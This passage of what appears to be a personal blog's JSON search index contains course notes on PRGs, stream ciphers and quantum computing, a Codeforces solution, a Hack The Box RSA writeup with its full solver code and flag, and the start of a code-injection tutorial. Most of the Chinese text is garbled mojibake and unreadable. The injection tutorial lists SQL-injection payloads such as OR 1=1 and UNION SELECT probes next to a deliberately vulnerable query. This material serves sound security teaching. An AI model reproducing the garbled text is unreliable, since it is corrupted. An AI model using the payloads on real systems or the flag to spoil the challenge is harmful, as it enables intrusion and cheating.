$(\\mathcal{S}, \\mathcal{R})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b = 0,1$, Experiment $b$ proceeds as follows:The challenger computes $r \\in \\mathcal{R}$ as follows and sends it to $\\mathcal{A}$:if $b = 0$: $s \\xleftarrow{R} \\mathcal{S},\\ r \\leftarrow G(s)$if $b = 1$: $r \\xleftarrow{R} \\mathcal{R}$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W_b$ be the event that $\\mathcal{A}$ outputs 1 å›¾ç¤ºï¼š Definition:we define $\\mathcal{A}$â€™s PRG distinguishing advantage as:PRGadv[\\mathcal{A}, G] := |\\Pr[W_0] - \\Pr[W_1]| Definition 11 (Secure PRG):A PRG $G$ is secure, if $PRGadv[\\mathcal{A}, G]$ is negligible for all PPT adversaries $\\mathcal{A}$. Definition 12 (Stream Cipher Construction):Given a PRG $G : \\mathcal{K} \\to \\{0,1\\}^L$, we define the basic stream cipher $\\Pi = (E, D)$ over$(\\mathcal{K}, \\{0,1\\}^L, \\{0,1\\}^L)$ as follows:$E(k, m) := G(k) \\oplus m$$D(k, c) := G(k) \\oplus c$","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"å¯†ç å­¦ Kryptografie","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/å¯†ç å­¦-Kryptografie","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"}],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://archer-baiyi.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"é‡å­è®¡ç®—å…¥é—¨","slug":"TUM info ç¬”è®°/é‡å­è®¡ç®—/é‡å­è®¡ç®—å…¥é—¨","date":"2025-04-20T13:40:00.000Z","updated":"2025-04-26T18:31:26.179Z","comments":true,"path":"2025/04/20/TUM info ç¬”è®°/é‡å­è®¡ç®—/é‡å­è®¡ç®—å…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/04/20/TUM%20info%20%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E5%85%A5%E9%97%A8/","excerpt":"é‡å­è®¡ç®—å…¥é—¨","text":"IntroductionåŸºæœ¬æ¦‚å¿µé‡å­æ¯”ç‰¹ï¼ˆQuantum bits, qubitsï¼‰æ™®é€šçš„æ¯”ç‰¹ï¼ˆbitï¼‰åªèƒ½å–ä¸¤ç§ç¦»æ•£å€¼ï¼š0å’Œ1ã€‚ è€Œé‡å­æ¯”ç‰¹ï¼ˆQuantum bits, qubitsï¼‰åˆ™æ˜¯å¤„äº0å’Œ1çš„å åŠ æ€ï¼ˆsuperpositionï¼‰ï¼šä¸€ä¸ªé‡å­æ¯”ç‰¹çš„ä¸€èˆ¬æ€ï¼ˆquantum stateï¼‰$|\\psi\\rangle$ ä¸€èˆ¬å†™ä½œï¼š |\\psi\\rangle = \\alpha\\,|0\\rangle + \\beta\\,|1\\rangle, \\ \\ \\alpha,\\beta \\in \\mathbb{C}æ»¡è¶³ |\\alpha|^2 + |\\beta|^2 = 1 è¿™é‡Œçš„ç¬¦å· $|\\psi\\rangle$ å«åš Ket-notationã€‚ æˆ‘ä»¬å¯ä»¥å°†$|0\\rangle,|1\\rangle$ å½“æˆä¸€ä¸ªbasisï¼Œç„¶åå°†qubitçš„æ‰€æœ‰çŠ¶æ€çœ‹æˆæ˜¯ä¸€ä¸ªäºŒç»´ç©ºé—´çš„å­é›†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™æˆ |\\psi\\rangle = \\begin{pmatrix} \\alpha \\\\ \\beta \\end{pmatrix}å½“ç„¶ï¼Œåœ¨é‡å­æ¯”ç‰¹è¢«è§‚æµ‹æ—¶ï¼Œæˆ‘ä»¬åªä¼šå¾—åˆ°0æˆ–è€…1çš„ç»“æœã€‚å…¶ä¸­è§‚æµ‹åˆ°0çš„æ¦‚ç‡ä¸º $|\\alpha|^2$ï¼Œè§‚æµ‹åˆ°1çš„æ¦‚ç‡ä¸º $|\\beta|^2$ã€‚è§‚æµ‹è¡Œä¸ºæœ¬èº«ä¹Ÿä¼šæ”¹å˜qubitã€‚å¦‚æœè§‚æµ‹åˆ°0ï¼Œé‚£ä¹ˆqubitä¼šå˜æˆ $|\\psi\\rangle = |0\\rangle$ï¼Œå¦‚æœè§‚æµ‹åˆ°1ï¼Œé‚£ä¹ˆqubitä¼šå˜æˆ $|\\psi\\rangle = |1\\rangle$ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è§‚æµ‹åˆ°ä¸€ä¸ªé‡å­æ¯”ç‰¹çš„çŠ¶æ€ï¼Œå³æ— æ³•ç›´æ¥æµ‹é‡$\\alpha$å’Œ$\\beta$çš„å€¼ã€‚ å½“ç„¶æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å…¶ä»–æ–¹æ³•æ¥è¡¨ç¤ºé‡å­æ¯”ç‰¹ï¼š å› ä¸º$|\\alpha|^2 + |\\beta|^2 = 1$ï¼Œæ‰€ä»¥å½“$\\alpha$å’Œ$\\beta$æ˜¯å®æ•°æ—¶ï¼Œä¸€å®šå­˜åœ¨ä¸€ä¸ª$\\theta\\in \\mathbb{R}$ ä½¿å¾—ï¼š \\alpha = cos(\\frac{\\theta}{2}) , \\ \\ \\beta = sin(\\frac{\\theta}{2})æ¨å¹¿åˆ°å¤æ•°ä¾¿å¯ä»¥å¾—åˆ°ï¼šï¼ˆå› ä¸ºæ¯ä¸ªå¤æ•°éƒ½å¯ä»¥å†™æˆæåæ ‡çš„å½¢å¼ï¼š $c = re^{i\\gamma} = |c| \\cdot e^{i\\gamma}$ï¼‰ \\alpha = e^{i\\gamma} cos(\\frac{\\theta}{2}) , \\ \\ \\beta = e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2})å› æ­¤æˆ‘ä»¬å¯ä»¥å°†$|\\psi\\rangle$å†™æˆï¼š \\begin{align} |\\psi\\rangle &= e^{i\\gamma} cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2}) \\\\ &= e^{i\\gamma}\\Bigl(cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\varphi}sin(\\frac{\\theta}{2})\\Bigl) \\end{align}å…¶ä¸­$ \\theta \\in [0, \\pi],\\quad \\varphi, \\gamma \\in [0, 2\\pi)$ã€‚ ç”±äº$e^{i\\gamma}$å¯¹æˆ‘ä»¬æ¥è¯´å¹¶ä¸é‡è¦ï¼ˆåé¢ä¼šè¯¦ç»†è®²ï¼‰ï¼Œæ‰€ä»¥ä¸€ä¸ªqubitå®é™…ä¸Šåªéœ€è¦2ä¸ªå®æ•°å‚æ•°ï¼ˆ$\\theta, \\varphi$ï¼‰ã€‚ç”±æ­¤æ¯ä¸ªqubitéƒ½å¯¹åº” Bloch Sphere çš„surfaceä¸Šçš„ä¸€ä¸ªç‚¹ï¼š r = \\begin{pmatrix} cos(\\varphi)sin(\\theta)\\\\ sin(\\varphi)sin(\\theta)\\\\ cos(\\theta) \\end{pmatrix}Bloch Sphereï¼š æ³¨æ„ï¼Œ$|0\\rangle$å’Œ$|1\\rangle$å¯¹åº”çš„$\\theta$çš„å€¼åˆ†åˆ«ä¸º0å’Œ$\\pi$ï¼Œæ‰€ä»¥ä»–ä»¬å¯¹åº”Bloch Sphereçš„2ä¸ªæç‚¹ï¼ˆpolesï¼‰ã€‚ å•é‡å­æ¯”ç‰¹é—¨ï¼ˆSingle qubit gateï¼‰æˆ‘ä»¬ä¸€èˆ¬ç”¨ä¸€ä¸ªcomplex unitary matrix Uæ¥è¡¨ç¤ºqubitçš„çŠ¶æ€å˜åŒ–ï¼š |\\psi\\rangle' = U \\cdot |\\psi\\rangleå¯¹åº”çš„ç”µè·¯å›¾ä¸€èˆ¬è¿™æ ·ç”»ï¼š ä¸‹é¢æ¥çœ‹ä¸€äº›ä¾‹å­ï¼š ä»¥ä¸‹3ä¸ªï¼ˆX,Y,Zï¼‰å«åšPauli matrices: Pauli-X gate: X = \\sigma_1 = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix}æ³¨æ„åˆ°ï¼š X|0\\rangle = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix} \\cdot \\begin{pmatrix} 0 \\\\ 1 \\end{pmatrix}= |1\\rangle X|1\\rangle = |0\\ranglePauli-Y gate: Y = \\sigma_2 = \\begin{pmatrix} 0 & -i \\\\ i & 0 \\end{pmatrix}Pauli-Z gate: Z = \\sigma_3 = \\begin{pmatrix} 1 & 0 \\\\ 0 & -1 \\end{pmatrix}æ³¨æ„åˆ°Zä¸ä¼šæ”¹å˜$|0\\rangle$ï¼Œä½†æ˜¯ä¼šæ”¹å˜$|1\\rangle$çš„ç³»æ•°çš„ç¬¦å·ï¼š å‡è®¾ \\begin{align} Z \\ |\\psi\\rangle &= cos(\\frac{\\theta}{2}) \\ |0\\rangle - e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\pi}e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\varphi+\\pi)}sin(\\frac{\\theta}{2}) \\end{align}è¿™åŒæ ·æ„å‘³ç€$|\\psi\\rangle $ä¼šæ²¿ç€Zè½´æ—‹è½¬$180^\\circ$ã€‚ è€Œ Pauli vector æŒ‡çš„åˆ™æ˜¯ $\\sigma = (\\sigma_1,\\sigma_2,\\sigma_3) = (X,Y,Z)$ã€‚ï¼ˆa vector of $2\\times 2$ matricesï¼‰","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"é‡å­è®¡ç®— Quantum Computing","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/é‡å­è®¡ç®—-Quantum-Computing","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"}],"tags":[{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/tags/Quantum-Computing/"},{"name":"é‡å­è®¡ç®—","slug":"é‡å­è®¡ç®—","permalink":"https://archer-baiyi.github.io/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"}]},{"title":"AESåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•","slug":"CTF/Crypto/AESåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•","date":"2025-04-19T18:00:59.000Z","updated":"2025-04-19T18:12:32.582Z","comments":true,"path":"2025/04/19/CTF/Crypto/AESåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•/","permalink":"https://archer-baiyi.github.io/2025/04/19/CTF/Crypto/AES%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"IntroductionAES-ECBECBçš„å…¨ç§°ä¸º Electronic Code Book Modusã€‚ æ”»å‡»æ˜æ–‡æ”»å‡»AES-CBCCBCçš„å…¨ç§°ä¸º Cipher Block Chaining Modusã€‚ éœ€è¦ä¸€ä¸ªå¯†é’¥kä»¥åŠä¸€ä¸ªInitialisierungsvektor IVã€‚IVæ˜¯ä¸éœ€è¦ä¿å¯†çš„ï¼Œå¾ˆå¤šæ—¶å€™ä¼šç›´æ¥æ”¾åœ¨å¯†æ–‡çš„å¼€å¤´ã€‚ åŠ å¯†ï¼š è§£å¯†ï¼š æ”»å‡»Padding OracleAES-CTRè¿™ä¸ªæ¨¡å¼ä¼šç”Ÿæˆä¸€ä¸²å¯†é’¥æµï¼Œç„¶åé€šè¿‡ä¸æ˜æ–‡è¿›è¡Œå¼‚æˆ–æ“ä½œè¿›è¡ŒåŠ å¯†ã€‚ ä¸€å¼€å§‹éœ€è¦é€‰æ‹©/ç”Ÿæˆä¸€ä¸ªéšæœºæ•°Nonceï¼Œå¹¶åˆå§‹åŒ–è®¡æ•°å™¨ï¼ˆcounter/ctrï¼‰ä¸º0ã€‚kä¸ºå¯†é’¥ã€‚ åŠ å¯†ï¼š è§£å¯†ï¼š","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/tags/CTR/"}]},{"title":"Codeforce Raising_Bacteria Task","slug":"ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Raising-Bacteria-Task","date":"2025-04-09T06:26:18.000Z","updated":"2025-04-09T06:49:22.141Z","comments":true,"path":"2025/04/09/ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","permalink":"https://archer-baiyi.github.io/2025/04/09/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯å¯¹äºŒè¿›åˆ¶çš„ç†è§£ã€‚ å‡è®¾æˆ‘ä»¬åœ¨ç¬¬ $i$ å¤©ä¼šæ”¾å…¥æ•°é‡ä¸º $x_i$ çš„ç»†èŒï¼Œé‚£ä¹ˆ $n$ å¤©ä¹‹åä¼šå¾—åˆ° $\\sum^n_{i=0}x_i \\cdot 2^i$ ã€‚ æ‰€ä»¥ç»™å®šä¸€ä¸ªæ•° $x$ ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç»„ $[x_0,x_1,â€¦,x_n]$ ï¼Œä½¿å¾— $\\sum^n_{i=0}x_i$ æœ€å°ï¼Œå¹¶ä¸” $\\sum^n_{i=0}x_i \\cdot 2^i = x$ ï¼Œå³ \\underset{[x_0,x_1,...,x_n]}{\\text{min}}\\sum^n_{i=0}x_i \\quad\\text{s.t.} \\sum^n_{i=0}x_i \\cdot 2^i = xå‡è®¾ $\\sum^n_{i=0}a_i \\cdot 2^i$ ä¸º $x$ çš„äºŒè¿›åˆ¶å±•å¼€ã€‚æˆ‘ä»¬ç°åœ¨è¯æ˜ $[a_0,â€¦,a_n]$ æ­£æ˜¯è¿™ä¸ªæœ€ä¼˜åŒ–é—®é¢˜çš„è§£ï¼š é¦–å…ˆå¾ˆæ˜¾ç„¶ $[a_0,â€¦,a_n]$ æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼ˆs.t. çš„éƒ¨åˆ†ï¼‰ã€‚å‡è®¾ç°åœ¨å­˜åœ¨ $[b_0,â€¦,b_n]$ ä½¿å¾— $\\sum^n_{i=0}b_i \\cdot 2^i = x$ å¹¶ä¸” $\\sum^n_{i=0}b_i \\leq \\sum^n_{i=0}a_i$ï¼Œå› ä¸ºäºŒè¿›åˆ¶å±•å¼€æ°¸è¿œæ˜¯å”¯ä¸€çš„ï¼Œä¸éš¾å¾—åˆ° $\\forall i : a_i = b_i$ã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™é“é¢˜éœ€è¦åšçš„å°±æ˜¯è®¡ç®— $\\sum^n_{i=0}a_i$ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æ•° $x$ çš„äºŒè¿›åˆ¶è¡¨è¾¾é‡Œä¸€å…±æœ‰å¤šå°‘ä¸ª1ã€‚ ä»£ç C++1234567891011#include &lt;iostream&gt;#include &lt;bitset&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; cout &lt;&lt; __builtin_popcount(x) &lt;&lt; endl; // __builtin_popcount(x) ä¼šè¿”å›æ•´æ•° x çš„äºŒè¿›åˆ¶ä¸­ 1 çš„ä¸ªæ•°ã€‚ return 0;&#125; ä¹Ÿå¯ä»¥åŸå§‹ä¸€ç‚¹ï¼š 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; int count = 0; while (x &gt; 0) &#123; if (x % 2 == 1) &#123; count++; &#125; x /= 2; &#125; cout &lt;&lt; count &lt;&lt; endl; return 0;&#125;","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/tags/binary/"}]},{"title":"HTB-RSAisEasy-Writeup","slug":"CTF/Crypto/HTB-RSAisEasy-Writeup","date":"2025-04-07T20:51:41.000Z","updated":"2025-04-07T21:26:21.507Z","comments":true,"path":"2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","excerpt":"","text":"é¢˜ç›® é™„ä»¶ï¼š 123456789101112131415161718192021222324#!/usr/bin/env python3from Crypto.Util.number import bytes_to_long, getPrimefrom secrets import flag1, flag2from os import urandomflag1 = bytes_to_long(flag1)flag2 = bytes_to_long(flag2)p, q, z = [getPrime(512) for i in range(3)]e = 0x10001n1 = p * qn2 = q * zc1 = pow(flag1, e, n1)c2 = pow(flag2, e, n2)E = bytes_to_long(urandom(69))print(f&#x27;n1: &#123;n1&#125;&#x27;)print(f&#x27;c1: &#123;c1&#125;&#x27;)print(f&#x27;c2: &#123;c2&#125;&#x27;)print(f&#x27;(n1 * E) + n2: &#123;n1 * E + n2&#125;&#x27;) output.txtï¼š 12345n1: 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269c1: 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2: 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673(n1 * E) + n2: 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163 åˆ†ææˆ‘ä»¬é¦–å…ˆå°†å·²çŸ¥æ¡ä»¶åˆ—å‡ºæ¥ï¼š \\begin{align} n1 = p\\cdot q\\\\ n2 = q \\cdot z \\end{align}å¹¶ä¸”æˆ‘ä»¬æœ‰ $n1$ ä»¥åŠ $n1 \\cdot E + n2$ çš„å€¼ã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡è¿™äº›ä¿¡æ¯è®¡ç®—å‡º $p,q,z$ çš„å€¼ã€‚ï¼ˆå› ä¸ºç»™çš„ $n1 \\cdot E + n2$ ä¸æ˜¯ $n1$ çš„å€æ•°ï¼Œæ‰€ä»¥gcd$(p,z)= 1$ï¼‰ æ³¨æ„åˆ°ï¼š n1 \\cdot E + n2 = q(p \\cdot E + z)ä»¥åŠ \\text{gcd}(n1, n1 \\cdot E + n2) = \\text{gcd}(p\\cdot q, p \\cdot q \\cdot E + q \\cdot z) = q \\cdot \\text{gcd}(p, p \\cdot E + z) \\overset{\\text{gcd}(p,z)=1}{=} qå› ä¸º $p,q,z$ å‡ä¸º512ä½çš„è´¨æ•°ï¼Œæ‰€ä»¥å®ƒä»¬çš„å–å€¼èŒƒå›´æ˜¯ï¼š 2^{511} \\leq p,q,z \\leq 2^{512}æ‰€ä»¥zé™¤ä»¥qä¸€å®šæ˜¯å°äºç­‰äº2çš„ï¼Œè¿™æ„å‘³ç€ï¼š z \\in \\{(z \\text{ mod } p), p + (z \\text{ mod } p)\\}ç”±æ­¤ï¼Œè§£å¯†çš„æµç¨‹ä¸ºï¼š å…ˆé€šè¿‡è®¡ç®— $n1$ å’Œ $n1 \\cdot E + n2$ çš„æœ€å¤§å…¬å› æ•°å¾—åˆ° $q$ æ ¹æ® $n1,q$ çš„å€¼å¾—åˆ° $p$ æ ¹æ® $n1 \\cdot E + n2, p, q$ è®¡ç®— $z$ ï¼ˆé€šè¿‡å°è¯•å¯ä»¥å¾—çŸ¥z &lt; pï¼Œæ‰€ä»¥ $z = (p \\cdot E + z \\text{ mod } p$ ï¼‰ è®¡ç®—d1, d2ç„¶åRSAè§£å¯†ã€‚ ä»£ç 123456789101112131415161718192021222324252627282930from math import gcdfrom Crypto.Util.number import long_to_bytesn1 = 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269# (n1 * E) + n2 = q(p*E + z):n12 = 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163c1= 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2= 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673e = 0x10001q = gcd(n1,n12 %n1)p = n1//qz = (n12//q) % pn2 = q*zd1 = pow(e,-1,(p-1)*(q-1))m1 = pow(c1,d1,n1)flag = long_to_bytes(m1)d2 = pow(e,-1,(z-1)*(q-1))m2 = pow(c2,d2,n2)flag+=long_to_bytes(m2)print(flag)# b&#x27;HTB&#123;1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?&#125;&#x27; è¿è¡Œå¾—åˆ°flagï¼šHTB{1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"}]},{"title":"ä»£ç æ³¨å…¥ Injection","slug":"CTF/Web/æ³¨å…¥-Injection","date":"2025-04-03T21:24:51.000Z","updated":"2025-08-19T08:33:40.689Z","comments":true,"path":"2025/04/03/CTF/Web/æ³¨å…¥-Injection/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/%E6%B3%A8%E5%85%A5-Injection/","excerpt":"å„ç§æ³¨å…¥æ¼æ´åŠæ–¹æ³•","text":"ä»£ç æ³¨å…¥ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆCode Injectionï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°ç›®æ ‡ç³»ç»Ÿä¸­æ‰§è¡Œçš„è¡Œä¸ºã€‚è¿™äº›æ¶æ„ä»£ç å¯ä»¥ç”¨äºä¿®æ”¹ã€ç ´åæˆ–çªƒå–ç³»ç»Ÿæ•°æ®ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆCode Injectionï¼‰åˆ©ç”¨äº†ç³»ç»Ÿåœ¨å¤„ç†è¾“å…¥æ•°æ®æ—¶çš„å¼±ç‚¹ï¼Œç»è¿‡ç²¾å¿ƒè®¾è®¡çš„æ¶æ„ä»£ç ä¼šè¢«è¯¯ä»¥ä¸ºæ˜¯åˆæ³•çš„æŒ‡ä»¤è€Œè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´å®‰å…¨æ¼æ´ã€‚ ä»¥ä¸‹æ˜¯å¸¸è§çš„æ³¨å…¥ç±»å‹ï¼š æ³¨å…¥ç±»å‹ æ³¨å…¥ç›®æ ‡ SQL æ³¨å…¥ æ•°æ®åº“æŸ¥è¯¢è¯­å¥ å‘½ä»¤æ³¨å…¥ æ“ä½œç³»ç»Ÿå‘½ä»¤ è„šæœ¬æ³¨å…¥ / XSS ç½‘é¡µè„šæœ¬ï¼ˆJSï¼‰ æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ æœåŠ¡å™¨æ¨¡æ¿è¯­æ³• LDAP æ³¨å…¥ LDAP æŸ¥è¯¢è¯­å¥ XML æ³¨å…¥ï¼ˆXXEï¼‰ XML å®ä½“/ç»“æ„ åŸºæœ¬ä¸Šæ‰€æœ‰çš„ä»£ç æ³¨å…¥çš„æ¼æ´éƒ½æ˜¯ç”±äºæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¶³å¤Ÿç»†è‡´çš„è¿‡æ»¤ã€‚ SQL Injectionæ¼æ´123456db = sqlite3.connect(&quot;:memory:&quot;, isolation_level=None)load_internet(db)cur = db.cursor()cur.execute(&quot;SELECT * FROM internet_index WHERE title LIKE &#x27;%&#123;&#125;%&#x27;&quot;.format(q)) #å°†æœªè¿‡æ»¤çš„è¾“å…¥ç›´æ¥æ‹¼æ¥è¿›SQLæŸ¥è¯¢è¯­å¥ æ³¨å…¥å¸¸ç”¨çš„æµ‹è¯•æ¼æ´çš„Payloadï¼š 1234567891011&#x27; OR 1=1 --&#x27; OR 1=1 -- -&#x27; OR 1=1 #&#x27; OR &#x27;1&#x27;=&#x27;1 --&#x27; OR 1=1; #&#x27; OR username=&#x27;admin&#x27; -- ï¼ˆåœ¨ MariaDB / MySQL ä¸­ï¼Œ# æ˜¯å•è¡Œæ³¨é‡Šç¬¦ï¼Œè€Œä¸æ˜¯--ã€‚ï¼‰ ç¡®è®¤æ¼æ´ç¡®å®å­˜åœ¨å¹¶ä¸”ç¡®å®šäº†å…·ä½“æ³¨å…¥æ ¼å¼äº†ä¹‹åä¾¿å¯ä»¥å¼€å§‹åç»­çš„æ­¥éª¤ã€‚ è€Œè¯»å–å…¶ä»–è¡¨æ ¼å‰æˆ‘ä»¬éœ€è¦å…ˆç¡®å®šå½“å‰è¡¨æ ¼çš„å­—æ®µæ•°ï¼ˆä¸€å…±æœ‰å¤šå°‘åˆ—ï¼‰ï¼Œå¯ä»¥é€šè¿‡Unionæ¥å°è¯•ï¼š 12345&#x27; UNION SELECT 1 -- &#x27; UNION SELECT 1,2 -- &#x27; UNION SELECT 1,2,3 -- &#x27; UNION SELECT 1,2,3,4 -- ... å¤±è´¥çš„æƒ…å†µä¸€èˆ¬ä¼šè¿”å›ç±»ä¼¼äº Error: The used SELECT statements have a different number of columns çš„æŠ¥é”™ã€‚ï¼ˆæˆ–è€…å°±å¹²è„†ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤ºï¼ŒæŠ‘æˆ–æ˜¯æç¤ºå¤±è´¥ã€‚ï¼‰è¿™ä¸ªæ–¹æ³•åŒæ—¶å¯ä»¥ç¡®å®šå½“å‰æ­£å¸¸æƒ…å†µçš„è¿”å›ç»“æœä¸ºå½“å‰è¡¨æ ¼çš„å“ªä¸ªå­—æ®µã€‚ ç¡®å®šå­—æ®µæ•°ï¼ˆè¡¨æ 